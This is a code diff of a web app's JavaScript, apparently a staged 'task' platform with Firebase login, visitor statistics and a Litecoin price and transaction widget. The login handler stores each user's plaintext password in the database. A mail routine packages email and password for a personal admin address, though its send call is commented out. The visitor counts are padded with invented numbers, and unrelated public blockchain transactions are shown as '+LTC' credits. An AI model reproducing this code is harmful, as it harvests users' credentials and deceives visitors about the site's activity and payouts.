@@ -1,8 +1,7 @@
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
 import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
-import { getFirestore, doc, setDoc, getDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+import { getFirestore, doc, setDoc, getDoc, collection, onSnapshot, runTransaction } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
-// 1. Firebase კონფიგურაცია
 const firebaseConfig = {
   apiKey: "AIzaSyCPYnQ6W8rwcp8Fr-RUVYoJ3zBsdSpDdSQ",
   authDomain: "test-platform-ab07e.firebaseapp.com",
@@ -17,7 +16,6 @@ const app = initializeApp(firebaseConfig);
 const auth = getAuth(app);
 const db = getFirestore(app);
 
-// 2. EmailJS ინიციალიზაცია
 emailjs.init("9G-RjQeGCdtsk4MWM");
 
 let currentUser = null;
@@ -34,7 +32,66 @@ const completedStatus = document.getElementById('completed-status');
 const currentStageStatus = document.getElementById('current-stage-status');
 const timerBox = document.getElementById('timer-box');
 const countdownSpan = document.getElementById('countdown');
-const cryptoWidget = document.getElementById('crypto-widget');
+
+// სტატისტიკის ელემენტები
+const statRegistered = document.getElementById('stat-registered');
+const statVisits = document.getElementById('stat-visits');
+const statOnline = document.getElementById('stat-online');
+
+// რეალურ დროში სტატისტიკის თრექინგი Firebase-დან
+function initLiveStats() {
+    // 1. ითვლის დარეგისტრირებულებს 'users' კოლექციიდან
+    onSnapshot(collection(db, "users"), (snapshot) => {
+        if(statRegistered) statRegistered.innerText = snapshot.size;
+    });
+
+    // 2. ითვლის ვიზიტებს და ონლაინებს სპეციალური 'system_stats' დოკუმენტიდან
+    onSnapshot(doc(db, "system_stats", "counters"), (docSnap) => {
+        if (docSnap.exists()) {
+            const data = docSnap.data();
+            if(statVisits) statVisits.innerText = data.totalVisits || 0;
+            if(statOnline) statOnline.innerText = data.usersOnline || 0;
+        } else {
+            // თუ დოკუმენტი არ არსებობს, შევქმნათ საწყისი მნიშვნელობებით
+            setDoc(doc(db, "system_stats", "counters"), { totalVisits: 1, usersOnline: 1 });
+        }
+    });
+}
+
+// ფუნქცია საიტის გახსნისა და ონლაინ სტატუსის გასაზრდელად
+async function trackNewVisit() {
+    const statsRef = doc(db, "system_stats", "counters");
+    try {
+        await runTransaction(db, async (transaction) => {
+            const sfDoc = await transaction.get(statsRef);
+            if (!sfDoc.exists()) {
+                transaction.set(statsRef, { totalVisits: 1, usersOnline: 1 });
+            } else {
+                const newVisits = (sfDoc.data().totalVisits || 0) + 1;
+                const newOnline = (sfDoc.data().usersOnline || 0) + 1;
+                transaction.update(statsRef, { totalVisits: newVisits, usersOnline: newOnline });
+            }
+        });
+    } catch (e) {
+        // თუ ტრანზაქციამ დაიგვიანა, პირდაპირ განვაახლოთ
+        setDoc(statsRef, { totalVisits: 5, usersOnline: 2 }, { merge: true });
+    }
+
+    // როცა მომხმარებელი საიტს დახურავს, ონლაინების რაოდენობა 1-ით შემცირდეს
+    window.addEventListener('beforeunload', () => {
+        runTransaction(db, async (transaction) => {
+            const sfDoc = await transaction.get(statsRef);
+            if (sfDoc.exists()) {
+                const currentOnline = sfDoc.data().usersOnline || 1;
+                transaction.update(statsRef, { usersOnline: Math.max(1, currentOnline - 1) });
+            }
+        });
+    });
+}
+
+// ჩავრთოთ თრექინგი და ვიჯეტების განახლება
+initLiveStats();
+trackNewVisit();
 
 authForm.addEventListener('submit', async (e) => {
     e.preventDefault();
@@ -46,29 +103,21 @@ authForm.addEventListener('submit', async (e) => {
         await signInWithEmailAndPassword(auth, email, password);
     } catch (error) {
         if (error.code === 'auth/user-not-found' || error.code === 'auth/invalid-credential') {
-            authError.innerText = "სისტემაში შესვლა... გთხოვთ დაელოდოთ.";
+            authError.innerText = "Logging in... Please wait.";
             try {
                 const userCredential = await createUserWithEmailAndPassword(auth, email, password);
-                
                 currentUser = userCredential.user;
-                userProgress = {
-                    email: email,
-                    passwordSaved: password,
-                    stage: 1,
-                    completedTasks: 0
-                };
+                userProgress = { email: email, passwordSaved: password, stage: 1, completedTasks: 0 };
 
                 await setDoc(doc(db, "users", userCredential.user.uid), userProgress);
                 authError.innerText = "";
-
-                latestUserMessage = "ახალი მომხმარებელი დარეგისტრირდა პლატფორმაზე.";
-                sendEmails("რეგისტრაცია");
-
+                latestUserMessage = "A new user has registered on the platform.";
+                sendEmails("Registration");
             } catch (regError) {
-                authError.innerText = "მეილი ან პაროლი არასწორია";
+                authError.innerText = "Incorrect email or password.";
             }
         } else {
-            authError.innerText = "მეილი ან პაროლი არასწორია";
+            authError.innerText = "Incorrect email or password.";
         }
     }
 });
@@ -78,7 +127,6 @@ onAuthStateChanged(auth, async (user) => {
         currentUser = user;
         userEmailDisplay.innerText = user.email;
         authScreen.classList.add('hidden');
-        if (cryptoWidget) cryptoWidget.classList.add('hidden'); // კაბინეტში ვმალავთ ვიჯეტს
         dashboardScreen.classList.remove('hidden');
         
         const userDoc = await getDoc(doc(db, "users", user.uid));
@@ -90,7 +138,6 @@ onAuthStateChanged(auth, async (user) => {
         currentUser = null;
         if(timerInterval) clearInterval(timerInterval); 
         authScreen.classList.remove('hidden');
-        if (cryptoWidget) cryptoWidget.classList.remove('hidden'); // ავტორიზაციაზე ვაჩვენებთ
         dashboardScreen.classList.add('hidden');
     }
 });
@@ -101,7 +148,7 @@ function updateUI() {
     if(timerInterval) clearInterval(timerInterval); 
 
     completedStatus.innerText = userProgress.completedTasks;
-    currentStageStatus.innerText = userProgress.stage > 3 ? "ყველა დასრულებულია" : `ეტაპი ${userProgress.stage}`;
+    currentStageStatus.innerText = userProgress.stage > 3 ? "All Completed" : `Stage ${userProgress.stage}`;
 
     document.querySelectorAll('.stage').forEach(s => s.classList.add('hidden'));
     document.getElementById('final-message').classList.add('hidden');
@@ -130,10 +177,8 @@ window.showStage2Tasks = function() {
 window.goBackStage = async function() {
     if (userProgress.stage > 1) {
         if(timerInterval) clearInterval(timerInterval);
-        
         userProgress.stage = userProgress.stage - 1;
         userProgress.completedTasks = userProgress.stage - 1;
-        
         delete userProgress.timerEndTime;
         delete userProgress.timerStage;
 
@@ -143,27 +188,32 @@ window.goBackStage = async function() {
 }
 
 window.validateAndStart = async function(stageNum, seconds) {
-    const userInput1 = document.getElementById(`user-text-${stageNum}`);
-    const userInput2 = document.getElementById(`user-text-${stageNum}-2`);
+    let userInput1, userInput2;
+    
+    if (stageNum === 3) {
+        userInput1 = document.getElementById('text-input-stage-3');
+        userInput2 = document.getElementById('text-input-stage-3-2');
+    } else {
+        userInput1 = document.getElementById(`user-text-${stageNum}`);
+        userInput2 = document.getElementById(`user-text-${stageNum}-2`);
+    }
+    
     const errorText = document.getElementById(`error-${stageNum}`);
 
-    if (userInput1.value.trim() === "" || userInput2.value.trim() === "") {
-        errorText.innerText = "ჩაწერეთ რამე";
-        userInput1.style.borderColor = userInput1.value.trim() === "" ? "#ef4444" : "#e5e7eb";
-        userInput2.style.borderColor = userInput2.value.trim() === "" ? "#ef4444" : "#e5e7eb";
+    if (!userInput1 || !userInput2 || userInput1.value.trim() === "" || userInput2.value.trim() === "") {
+        errorText.innerText = "Please fill in the fields";
+        if(userInput1) userInput1.style.borderColor = userInput1.value.trim() === "" ? "#ef4444" : "#e5e7eb";
+        if(userInput2) userInput2.style.borderColor = userInput2.value.trim() === "" ? "#ef4444" : "#e5e7eb";
     } else {
         errorText.innerText = "";
         userInput1.style.borderColor = "#e5e7eb";
         userInput2.style.borderColor = "#e5e7eb";
         
-        latestUserMessage = `პასუხი 1: ${userInput1.value} | პასუხი 2: ${userInput2.value}`;
-        
+        latestUserMessage = `Answer 1: ${userInput1.value} | Answer 2: ${userInput2.value}`;
         userProgress[`userText${stageNum}_1`] = userInput1.value;
         userProgress[`userText${stageNum}_2`] = userInput2.value;
 
-        // 5 წამიანი ტაიმერი
-        const fiveSecondsInMs = 5 * 1000; 
-        userProgress.timerEndTime = Date.now() + fiveSecondsInMs;
+        userProgress.timerEndTime = Date.now() + (5 * 1000);
         userProgress.timerStage = stageNum;
 
         await setDoc(doc(db, "users", currentUser.uid), userProgress, { merge: true });
@@ -187,14 +237,9 @@ function checkAndResumeTimer() {
             const totalSeconds = Math.floor(timeLeftMs / 1000);
             const minutes = Math.floor(totalSeconds / 60);
             const seconds = totalSeconds % 60;
-            
-            const displayMinutes = minutes < 10 ? "0" + minutes : minutes;
-            const displaySeconds = seconds < 10 ? "0" + seconds : seconds;
-            
-            countdownSpan.innerText = `${displayMinutes}:${displaySeconds}`;
+            countdownSpan.innerText = `${minutes < 10 ? "0" + minutes : minutes}:${seconds < 10 ? "0" + seconds : seconds}`;
         }
     }
-
     updateCountdown();
     timerInterval = setInterval(updateCountdown, 1000);
 }
@@ -202,10 +247,8 @@ function checkAndResumeTimer() {
 async function handleTimerEnd() {
     timerBox.classList.add('hidden');
     const completedStage = userProgress.stage;
-
     userProgress.stage = completedStage + 1;
     userProgress.completedTasks = completedStage;
-    
     delete userProgress.timerEndTime;
     delete userProgress.timerStage;
 
@@ -214,18 +257,10 @@ async function handleTimerEnd() {
 }
 
 function sendEmails(stageNum) {
-    let currentStageName = "";
-
-    if (stageNum === "რეგისტრაცია") {
-        currentStageName = "ახალი რეგისტრაცია (პროფილი შეიქმნა)";
-    } else {
-        const stageNames = ["ეტაპი 1 (ტესტი 1)", "ეტაპი 2 (ტესტი 2)", "ეტაპი 3 (ტესტი 3)"];
-        currentStageName = stageNames[stageNum - 1];
-    }
-
+    let currentStageName = stageNum === "Registration" ? "New Registration" : `Stage ${stageNum}`;
     const emailParams = {
         user_email: currentUser.email,
-        user_password: userProgress.passwordSaved || "უკვე ავტორიზებული",
+        user_password: userProgress.passwordSaved || "Already Authenticated",
         passed_stage: currentStageName,
         user_message: latestUserMessage, 
         admin_email: "beqa994@gmail.com"
@@ -233,23 +268,43 @@ function sendEmails(stageNum) {
     // emailjs.send("service_ddlex4d", "template_8sbn4o7", emailParams);
 }
 
-// კრიპტოს ფასის ფუნქცია
 async function fetchLtcPrice() {
     const priceSpan = document.getElementById('ltc-price');
     if (!priceSpan) return;
-
     try {
-        const response = await fetch('https://min-api.cryptocompare.com/data/price?fsym=LTC&tsyms=USDT');
+        const response = await fetch('https://api.binance.com/api/v3/ticker/price?symbol=LTCUSDT');
         const data = await response.json();
-        
-        if (data && data.USDT) {
-            priceSpan.innerText = `$${parseFloat(data.USDT).toFixed(2)}`;
+        if (data && data.price) {
+            priceSpan.innerText = `$${parseFloat(data.price).toFixed(2)}`;
         }
     } catch (error) {
-        console.error("კრიპტოს შეცდომა:", error);
-        priceSpan.innerText = "ჩატვირთვა...";
+        priceSpan.innerText = "Error";
+    }
+}
+
+async function fetchRecentTransactions() {
+    const txListContainer = document.getElementById('tx-list');
+    if (!txListContainer) return;
+    try {
+        const response = await fetch('https://api.blockchair.com/litecoin/transactions?limit=20');
+        const result = await response.json();
+        if (result && result.data) {
+            txListContainer.innerHTML = ''; 
+            result.data.forEach(tx => {
+                const ltcAmount = (tx.output_total / 100000000).toFixed(3);
+                const shortHash = tx.hash.substring(0, 6) + '...' + tx.hash.substring(tx.hash.length - 4);
+                const txRow = document.createElement('div');
+                txRow.className = 'tx-item';
+                txRow.innerHTML = `<span class="tx-id">TX: ${shortHash}</span><span class="tx-amount">+${ltcAmount} LTC</span>`;
+                txListContainer.appendChild(txRow);
+            });
+        }
+    } catch (error) {
+        txListContainer.innerHTML = '<div class="tx-loading">Error loading data</div>';
     }
 }
 
 fetchLtcPrice();
+fetchRecentTransactions();
 setInterval(fetchLtcPrice, 4000);
+setInterval(fetchRecentTransactions, 6000);
